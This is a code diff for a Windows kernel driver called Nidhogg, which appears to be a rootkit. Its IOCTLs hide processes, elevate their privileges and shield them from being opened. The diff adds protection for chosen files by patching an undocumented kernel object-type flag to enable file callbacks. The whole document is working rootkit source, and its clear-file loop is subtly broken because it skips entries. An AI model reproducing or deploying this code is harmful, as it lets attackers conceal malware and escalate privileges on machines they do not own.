@@ -1,16 +1,22 @@
 #include "pch.h"
 #include "Nidhogg.h"
 #include "ProcessUtils.hpp"
+#include "FileUtils.hpp"
 
 extern "C"
 NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING) {
 	auto status = STATUS_SUCCESS;
 	pGlobals.Init();
+	fGlobals.Init();
 
 	// Setting up the device object.
 	UNICODE_STRING deviceName = RTL_CONSTANT_STRING(L"\\Device\\Nidhogg");
 	UNICODE_STRING symbolicLink = RTL_CONSTANT_STRING(L"\\??\\Nidhogg");
 	PDEVICE_OBJECT DeviceObject = nullptr;
+
+	 // Enabling file callbacks.
+	POBJECT_TYPE ObjectTypeTemp = (POBJECT_TYPE)*IoFileObjectType;
+	*(UCHAR*)((UINT64)ObjectTypeTemp + SupportsObjectCallbacks) = AllowObjectCallbacks;
 
 	// Registering the process hooking function.
 	OB_OPERATION_REGISTRATION operations[] = {
@@ -18,17 +24,22 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING) {
 			PsProcessType,		// object type
 			OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE,
 			OnPreOpenProcess, nullptr	// pre, post
+		},
+		{
+			IoFileObjectType,
+			OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE,
+			OnPreFileOperation, nullptr
 		}
 	};
-	OB_CALLBACK_REGISTRATION reg = {
+	OB_CALLBACK_REGISTRATION registrationCallbacks = {
 		OB_FLT_REGISTRATION_VERSION,
-		1,				// operation count
+		2,				// operation count
 		RTL_CONSTANT_STRING(L"31105.6171"),		// altitude
 		nullptr,		// context
 		operations
 	};
 
-	status = ObRegisterCallbacks(&reg, &pGlobals.RegHandle);
+	status = ObRegisterCallbacks(&registrationCallbacks, &registrationHandle);
 
 	if (!NT_SUCCESS(status)) {
 		KdPrint((DRIVER_PREFIX "failed to register callbacks: (0x%08X)\n", status));
@@ -39,7 +50,7 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING) {
 
 	if (!NT_SUCCESS(status)) {
 		KdPrint((DRIVER_PREFIX "failed to create device: (0x%08X)\n", status));
-		ObUnRegisterCallbacks(pGlobals.RegHandle);
+		ObUnRegisterCallbacks(registrationHandle);
 		return status;
 	}
 
@@ -47,7 +58,7 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING) {
 
 	if (!NT_SUCCESS(status)) {
 		IoDeleteDevice(DeviceObject);
-		ObUnRegisterCallbacks(pGlobals.RegHandle);
+		ObUnRegisterCallbacks(registrationHandle);
 		KdPrint((DRIVER_PREFIX "failed to create symbolic link: (0x%08X)\n", status));
 		return status;
 	}
@@ -57,12 +68,15 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING) {
 	DriverObject->MajorFunction[IRP_MJ_CREATE] = DriverObject->MajorFunction[IRP_MJ_CLOSE] = NidhoggCreateClose;
 	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = NidhoggDeviceControl;
 
+	KdPrint((DRIVER_PREFIX "Initialization finished.\n"));
 	return status;
 }
 
 
 void NidhoggUnload(PDRIVER_OBJECT DriverObject) {
-	ObUnRegisterCallbacks(pGlobals.RegHandle);
+	ObUnRegisterCallbacks(registrationHandle);
+
+	KdPrint((DRIVER_PREFIX "Unloaded\n"));
 
 	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\Nidhogg");
 	IoDeleteSymbolicLink(&symLink);
@@ -92,7 +106,7 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 	auto len = 0;
 
 	switch (stack->Parameters.DeviceIoControl.IoControlCode) {
-	case IOCTL_NIDHOGG_PROTECT_BY_PID:
+	case IOCTL_NIDHOGG_PROTECT_PROCESS:
 	{
 		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
 		if (size % sizeof(ULONG) != 0) {
@@ -129,7 +143,7 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 		break;
 	}
 
-	case IOCTL_NIDHOGG_UNPROTECT_BY_PID:
+	case IOCTL_NIDHOGG_UNPROTECT_PROCESS:
 	{
 		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
 		if (size % sizeof(ULONG) != 0) {
@@ -143,12 +157,16 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 
 		for (int i = 0; i < size / sizeof(ULONG); i++) {
 			auto pid = data[i];
+
 			if (pid == 0) {
 				status = STATUS_INVALID_PARAMETER;
 				break;
 			}
-			if (!RemoveProcess(pid))
-				continue;
+
+			if (!RemoveProcess(pid)) {
+				status = STATUS_NOT_FOUND;
+				break;
+			}
 
 			len += sizeof(ULONG);
 
@@ -159,32 +177,15 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 		break;
 	}
 
-	case IOCTL_NIDHOGG_CLEAR_PID_PROTECTION:
+	case IOCTL_NIDHOGG_CLEAR_PROCESS_PROTECTION:
 	{
 		AutoLock locker(pGlobals.Lock);
-		::memset(&pGlobals.Pids, 0, sizeof(pGlobals.Pids));
+		memset(&pGlobals.Pids, 0, sizeof(pGlobals.Pids));
 		pGlobals.PidsCount = 0;
 		break;
 	}
 
-	case IOCTL_NIDHOGG_QUERY_PID:
-	{
-		auto size = stack->Parameters.DeviceIoControl.OutputBufferLength;
-
-		if (size % sizeof(ULONG) != 0) {
-			status = STATUS_INVALID_BUFFER_SIZE;
-			break;
-		}
-
-		auto data = (ULONG*)Irp->AssociatedIrp.SystemBuffer;
-
-		AutoLock locker(pGlobals.Lock);
-
-		data = pGlobals.Pids;
-		break;
-	}
-
-	case IOCTL_NIDHOGG_HIDE_BY_PID:
+	case IOCTL_NIDHOGG_HIDE_PROCESS:
 	{
 		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
 		if (size % sizeof(ULONG) != 0) {
@@ -210,7 +211,7 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 		break;
 	}
 
-	case IOCTL_NIDHOGG_ELEVATE_BY_PID:
+	case IOCTL_NIDHOGG_ELEVATE_PROCESS:
 	{
 		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
 
@@ -233,6 +234,83 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 				break;
 			}
 		}
+		break;
+	}
+
+	case IOCTL_NIDHOGG_PROTECT_FILE:
+	{
+		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
+
+		if (size % sizeof(WCHAR) != 0) {
+			KdPrint((DRIVER_PREFIX "Invalid buffer type.\n"));
+			status = STATUS_INVALID_BUFFER_SIZE;
+			break;
+		}
+
+		auto data = (WCHAR*)Irp->AssociatedIrp.SystemBuffer;
+
+		if (!data) {
+			KdPrint((DRIVER_PREFIX "Buffer is empty.\n"));
+			status = STATUS_INVALID_PARAMETER;
+			break;
+		}
+
+		AutoLock locker(fGlobals.Lock);
+
+		if (fGlobals.FilesCount == MAX_FILES) {
+			KdPrint((DRIVER_PREFIX "List is full.\n"));
+			status = STATUS_TOO_MANY_CONTEXT_IDS;
+			break;
+		}
+
+		if (!FindFile(data)) {
+			if (!AddFile(data)) {
+				status = STATUS_UNSUCCESSFUL;
+				break;
+			}
+		}
+
+		break;
+	}
+
+	case IOCTL_NIDHOGG_UNPROTECT_FILE:
+	{
+		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
+
+		if (size % sizeof(WCHAR) != 0) {
+			KdPrint((DRIVER_PREFIX "Invalid buffer type.\n"));
+			status = STATUS_INVALID_BUFFER_SIZE;
+			break;
+		}
+
+		auto data = (WCHAR*)Irp->AssociatedIrp.SystemBuffer;
+
+		if (!data) {
+			KdPrint((DRIVER_PREFIX "Buffer is empty.\n"));
+			status = STATUS_INVALID_PARAMETER;
+			break;
+		}
+
+		AutoLock locker(fGlobals.Lock);
+
+		if (!RemoveFile(data)) {
+			status = STATUS_NOT_FOUND;
+			break;
+		}
+		break;
+	}
+
+	case IOCTL_NIDHOGG_CLEAR_FILE_PROTECTION:
+	{
+		AutoLock locker(fGlobals.Lock);
+
+		for (int i = 0; i < fGlobals.FilesCount; i++) {
+			ExFreePoolWithTag(fGlobals.Files[i], DRIVER_TAG);
+			fGlobals.Files[i] = nullptr;
+			fGlobals.FilesCount--;
+		}
+
+		fGlobals.FilesCount = 0;
 		break;
 	}
 
